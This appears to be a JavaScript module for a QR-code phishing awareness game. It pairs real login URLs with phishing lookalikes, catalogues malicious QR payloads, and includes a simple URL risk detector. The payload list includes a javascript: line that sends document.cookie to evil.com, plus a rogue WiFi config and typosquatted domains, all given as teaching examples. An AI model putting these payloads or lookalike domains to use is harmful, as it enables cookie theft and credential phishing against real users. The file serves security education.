// ========== 核心数据与算法（可独立测试） ==========

/**
 * 火眼金睛挑战题库。
 * 每题包含：正规 URL、钓鱼 URL、攻击手法说明。
 */
const CHALLENGE_QUESTIONS = [
  {
    safe: 'https://www.alipay.com/login',
    danger: 'https://www.alipay.com.pay-verify.cc/login',
    tactic: '子域名伪装',
    explain: '攻击者注册了 pay-verify.cc 域名，把 www.alipay.com 放在子域名位置。浏览器实际连接的是 pay-verify.cc，跟支付宝没有任何关系。'
  },
  {
    safe: 'https://github.com/settings/security',
    danger: 'https://githuh.com/settings/security',
    tactic: 'Typosquatting（拼写欺骗）',
    explain: '把 github 中的 b 换成了 h（githuh）。快速扫一眼很难发现差异，尤其在二维码解码后的短暂预览中。'
  },
  {
    safe: 'https://accounts.google.com/signin',
    danger: 'https://accounts.gooɡle.com/signin',
    tactic: 'Unicode 混淆（IDN 攻击）',
    explain: '第二个 g 被替换成了 Unicode 字符 ɡ（U+0261，拉丁小写字母脚本 G）。肉眼几乎无法区分，但指向完全不同的服务器。'
  },
  {
    safe: 'https://wx.qq.com/scan-login',
    danger: 'https://bit.ly/3xWqLogin',
    tactic: '短链隐藏',
    explain: '短链接服务（bit.ly、t.cn 等）完全隐藏了真实目标 URL。你无法通过二维码内容判断它指向哪里，只能扫码后才知道。'
  },
  {
    safe: 'https://store.apple.com/order/12345',
    danger: 'https://store.apple.com-receipt.org/order/12345',
    tactic: '域名拼接欺骗',
    explain: '真实域名是 com-receipt.org，前面的 store.apple 只是子域名装饰。利用了人从左到右阅读的习惯，先看到 apple 就放松了警惕。'
  }
];

/**
 * Payload 展览馆数据。
 * 每种 payload 包含：类型名、图标、风险等级、示例内容、解释。
 */
const PAYLOAD_TYPES = [
  {
    id: 'url',
    title: '钓鱼 URL',
    icon: 'ti-link',
    risk: 'high',
    example: 'https://www.paypa1.com/verify?token=abc123',
    desc: '最常见的攻击方式。二维码指向一个高仿网站，诱导你输入账号密码。域名用数字 1 替换字母 l，肉眼难以察觉。',
    howItWorks: '受害者扫码后打开浏览器，看到「PayPal 安全验证」页面，输入账号密码后信息直接发送到攻击者服务器。'
  },
  {
    id: 'wifi',
    title: 'WiFi 自动连接',
    icon: 'ti-wifi',
    risk: 'high',
    example: 'WIFI:T:WPA;S:Starbucks_Free;P:h4ck3r123;H:true;;',
    desc: '二维码可以编码 WiFi 配置。扫码后手机自动连接到攻击者控制的热点，所有流量都经过中间人。',
    howItWorks: '手机识别到 WIFI: 协议后自动弹出「加入网络」。连接后，攻击者可以拦截未加密的流量、DNS 劫持、注入恶意脚本。'
  },
  {
    id: 'vcard',
    title: 'vCard 通讯录注入',
    icon: 'ti-address-book',
    risk: 'medium',
    example: 'BEGIN:VCARD\nVERSION:3.0\nFN:IT Support\nTEL:+86-400-SCAM\nURL:https://fake-support.com\nEND:VCARD',
    desc: '扫码后弹出「添加联系人」。一旦保存，你的通讯录里就多了一个假的「IT 支持」号码。下次遇到问题时可能拨打这个号码。',
    howItWorks: '社会工程学的铺垫手段：先埋一个假联系人，等受害者主动上门。比直接打骚扰电话可信度高得多。'
  },
  {
    id: 'sms',
    title: '预填短信',
    icon: 'ti-message',
    risk: 'medium',
    example: 'SMSTO:10086:CXXZ#姓名#身份证号',
    desc: '扫码后自动跳转到短信界面，收件人和内容已填好。如果是退订短信还好，但也可能是发送付费短信或泄露个人信息的内容。',
    howItWorks: '利用手机的 sms: / smsto: 协议预填内容。用户如果不仔细看就点发送，可能发出包含个人信息的短信到攻击者号码。'
  },
  {
    id: 'geo',
    title: '地理位置标记',
    icon: 'ti-map-pin',
    risk: 'low',
    example: 'geo:39.9042,116.4074?z=18',
    desc: '打开地图应用定位到指定坐标。单独看危害不大，但配合社工手段可以诱导受害者前往特定地点（如假的取件点）。',
    howItWorks: '二维码贴在快递柜、取件通知上，引导受害者到攻击者布置的地点。虽然技术危害低，但属于物理层面社工的一环。'
  },
  {
    id: 'js',
    title: 'JavaScript 注入',
    icon: 'ti-code',
    risk: 'high',
    example: 'javascript:document.location="https://evil.com/?cookie="+document.cookie',
    desc: '在部分旧版浏览器或内嵌 WebView 中，javascript: 协议可能被直接执行。现代浏览器已基本修复，但某些 App 内扫码器仍有风险。',
    howItWorks: '攻击者将 JS 代码编码为二维码。如果扫码器直接在当前 WebView 上下文中打开，代码就能窃取 Cookie、Session Token 等。'
  }
];

/**
 * 判断 URL 是否「看起来安全」的简单启发式检测。
 * 返回风险点列表。
 */
function analyzeUrl(url) {
  const risks = [];
  if (!url) return risks;

  // 短链检测
  const shortDomains = ['bit.ly', 't.cn', 'tinyurl.com', 'goo.gl', 'ow.ly', 'is.gd', 'buff.ly'];
  try {
    const u = new URL(url);
    if (shortDomains.some(d => u.hostname === d || u.hostname.endsWith('.' + d))) {
      risks.push({ type: 'short-url', severity: 'high', desc: '短链接隐藏了真实目标' });
    }
    // Typosquatting: 检查知名域名的相似拼写
    const knownDomains = ['google.com', 'github.com', 'alipay.com', 'apple.com', 'paypal.com', 'qq.com', 'taobao.com'];
    const host = u.hostname.replace('www.', '');
    for (const known of knownDomains) {
      if (host !== known && levenshtein(host, known) <= 2 && host.includes(known.split('.')[0].slice(0, 3))) {
        risks.push({ type: 'typosquat', severity: 'high', desc: `域名与 ${known} 相似，可能是仿冒` });
      }
    }
    // 子域名伪装
    const parts = u.hostname.split('.');
    if (parts.length > 3) {
      const suspiciousBrands = ['alipay', 'wechat', 'apple', 'google', 'paypal', 'github'];
      for (const brand of suspiciousBrands) {
        if (parts.slice(0, -2).some(p => p.includes(brand)) && !u.hostname.endsWith(brand + '.com')) {
          risks.push({ type: 'subdomain-spoof', severity: 'high', desc: `${brand} 出现在子域名中，真实域名是 ${parts.slice(-2).join('.')}` });
        }
      }
    }
    // Unicode 字符检测（URL 构造器会 punycode 化，所以用原始字符串检测）
    const hostPart = url.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    if (/[^\x00-\x7F]/.test(hostPart)) {
      risks.push({ type: 'unicode', severity: 'high', desc: '域名包含非 ASCII 字符（可能是 IDN 混淆攻击）' });
    }
  } catch (e) {
    // 非 URL 格式，尝试原始字符串检测
    const hostPart = url.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    if (/[^\x00-\x7F]/.test(hostPart)) {
      risks.push({ type: 'unicode', severity: 'high', desc: '域名包含非 ASCII 字符（可能是 IDN 混淆攻击）' });
    }
  }

  // javascript: 协议
  if (url.toLowerCase().startsWith('javascript:')) {
    risks.push({ type: 'js-injection', severity: 'critical', desc: '包含可执行的 JavaScript 代码' });
  }

  return risks;
}

/**
 * Levenshtein 编辑距离。
 */
function levenshtein(a, b) {
  const m = a.length, n = b.length;
  const dp = Array.from({ length: m + 1 }, () => Array(n + 1).fill(0));
  for (let i = 0; i <= m; i++) dp[i][0] = i;
  for (let j = 0; j <= n; j++) dp[0][j] = j;
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      dp[i][j] = a[i-1] === b[j-1]
        ? dp[i-1][j-1]
        : 1 + Math.min(dp[i-1][j], dp[i][j-1], dp[i-1][j-1]);
    }
  }
  return dp[m][n];
}

/**
 * 随机打乱数组（Fisher-Yates）。
 */
function shuffleArray(arr) {
  const a = arr.slice();
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

// 导出供测试
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { CHALLENGE_QUESTIONS, PAYLOAD_TYPES, analyzeUrl, levenshtein, shuffleArray };
}
